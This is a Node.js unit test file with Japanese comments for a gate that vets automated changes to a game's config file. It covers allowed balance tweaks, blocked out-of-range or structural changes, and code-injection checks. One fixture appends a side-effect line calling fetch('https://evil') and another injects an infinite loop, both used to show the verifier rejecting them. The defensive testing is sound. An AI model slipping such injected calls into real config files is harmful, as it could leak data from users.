// ====================================================================
// loop/gate.test.mjs — 安全弁(gate)の単体テスト。
//   「危険な変更が通らない」「安全な変更を誤ってブロックしない」を担保。
// 実行: node --test loop/
// ====================================================================

import test from "node:test";
import assert from "node:assert/strict";
import { gate } from "./gate.mjs";
import { verifyText } from "./verify.mjs";
import { computePatch } from "./patch.mjs";
import { loadConfig, CONFIG_PATH, getProfile } from "./config.mjs";
import { readFileSync } from "node:fs";

const profile = getProfile("reflex");
const hiraganaProfile = getProfile("hiragana");
const base = loadConfig();
const baseText = readFileSync(CONFIG_PATH, "utf8");
const hiraganaBase = loadConfig(hiraganaProfile.CONFIG_PATH);
const clone = () => structuredClone(base);
const bumped = () => { const c = clone(); c.version = base.version + 1; return c; };

// ── pass すべきケース ───────────────────────────────────────────
test("PASS: バランス易化(+12%)は通る", () => {
  const n = bumped(); n.balance.targetLifeMs = 1230;
  const r = gate({ oldConfig: base, newConfig: n });
  assert.equal(r.pass, true, r.failures.join("; "));
});

test("PASS: 文言修正(text)は通る", () => {
  const n = bumped(); n.text.tagline = "光った的を、消える前にタップ！";
  assert.equal(gate({ oldConfig: base, newConfig: n }).pass, true);
});

test("PASS: ドキュメント同時変更(PATCHNOTES.md)は許容", () => {
  const n = bumped(); n.balance.targetSizePx = 80;
  const r = gate({ oldConfig: base, newConfig: n, changedFiles: [profile.GAME_CONFIG_FILE, profile.PATCHNOTES_FILE, profile.DECISION_FILE] });
  assert.equal(r.pass, true, r.failures.join("; "));
});

test("PASS: hiragana profile のバランス易化は通る", () => {
  const n = structuredClone(hiraganaBase);
  n.version = hiraganaBase.version + 1;
  n.balance.distractorSimilarity = 0.55;
  const r = gate({ oldConfig: hiraganaBase, newConfig: n, profile: hiraganaProfile });
  assert.equal(r.pass, true, r.failures.join("; "));
});

test("PASS: 回帰が許容範囲内なら通る", () => {
  const n = bumped(); n.balance.targetLifeMs = 1200;
  const r = gate({ oldConfig: base, newConfig: n, regression: { available: true, currentNegRate: 0.52, baselineNegRate: 0.5 } });
  assert.equal(r.pass, true, r.failures.join("; "));
});

// ── block すべきケース ──────────────────────────────────────────
test("BLOCK: 変化幅が±25%超", () => {
  const n = bumped(); n.balance.targetLifeMs = Math.round(base.balance.targetLifeMs * 1.3);
  assert.equal(gate({ oldConfig: base, newConfig: n }).pass, false);
});

test("BLOCK: 絶対安全域の外", () => {
  const n = bumped(); n.balance.targetSizePx = 200; // 上限140超
  assert.equal(gate({ oldConfig: base, newConfig: n }).pass, false);
});

test("BLOCK: version が +1 でない", () => {
  const n = clone(); n.version = base.version; n.balance.targetLifeMs = 1200; // 据え置き
  assert.equal(gate({ oldConfig: base, newConfig: n }).pass, false);
  const n2 = clone(); n2.version = base.version + 5; n2.balance.targetLifeMs = 1200;
  assert.equal(gate({ oldConfig: base, newConfig: n2 }).pass, false);
});

test("BLOCK: キー追加", () => {
  const n = bumped(); n.balance.secretMultiplier = 2;
  assert.equal(gate({ oldConfig: base, newConfig: n }).pass, false);
});

test("BLOCK: キー削除", () => {
  const n = bumped(); delete n.balance.comboBonus;
  assert.equal(gate({ oldConfig: base, newConfig: n }).pass, false);
});

test("BLOCK: game-config.js 以外のコードファイル変更", () => {
  const n = bumped(); n.balance.targetLifeMs = 1200;
  assert.equal(gate({ oldConfig: base, newConfig: n, changedFiles: [profile.GAME_CONFIG_FILE, "reflex/game.js"] }).pass, false);
  assert.equal(gate({ oldConfig: base, newConfig: n, changedFiles: ["reflex/game.js"] }).pass, false);
});

test("BLOCK: text を非文字列に変えるのは不可", () => {
  const n = bumped(); n.text.title = 12345;
  assert.equal(gate({ oldConfig: base, newConfig: n }).pass, false);
});

test("BLOCK: 基準値0からの自動変更(missPenalty)", () => {
  const z = clone(); z.balance.missPenalty = 0; // 旧=0
  const n = structuredClone(z); n.version = z.version + 1; n.balance.missPenalty = 20;
  assert.equal(gate({ oldConfig: z, newConfig: n }).pass, false);
});

test("BLOCK: 回帰でネガ率が悪化", () => {
  const n = bumped(); n.balance.targetLifeMs = 1200;
  assert.equal(gate({ oldConfig: base, newConfig: n, regression: { available: true, currentNegRate: 0.7, baselineNegRate: 0.5 } }).pass, false);
});

// ── code-injection 防御（verify が担保） ───────────────────────
test("VERIFY-BLOCK: 末尾に副作用コードを注入したファイルは弾く", () => {
  const evil = baseText + "\nwindow.GAME_CONFIG.__x = (typeof fetch!=='undefined') && fetch('https://evil');\n";
  const r = verifyText(evil, { expectedVersion: base.version });
  assert.equal(r.ok, false); // 想定外キー追加 or 実行エラーで不合格
});

test("VERIFY-BLOCK: 無限ループ注入はタイムアウトで弾く", () => {
  const evil = "while(true){}\n" + baseText;
  const r = verifyText(evil, { expectedVersion: base.version });
  assert.equal(r.ok, false);
});

test("VERIFY-OK: 正常パッチは合格", () => {
  const n = computePatch(baseText, [{ path: "balance.targetLifeMs", to: 1230, kind: "balance" }]);
  const r = verifyText(n, { expectedVersion: base.version + 1 });
  assert.equal(r.ok, true, r.errors.join("; "));
});

// ── patch のテキスト変換 ───────────────────────────────────────
test("PATCH: コメント・書式を保持して数値だけ置換", () => {
  const n = computePatch(baseText, [{ path: "balance.spawnIntervalMs", to: 820, kind: "balance" }]);
  assert.match(n, /spawnIntervalMs: 820,\s+\/\/ 的が出る間隔/);
  assert.match(n, new RegExp(`version: ${base.version + 1},`));
});

test("PATCH: 存在しない文言は throw（曖昧なら触らない）", () => {
  assert.throws(() => computePatch(baseText, [{ path: "text.tagline", from: "存在しない文言", to: "x", kind: "text" }]));
});
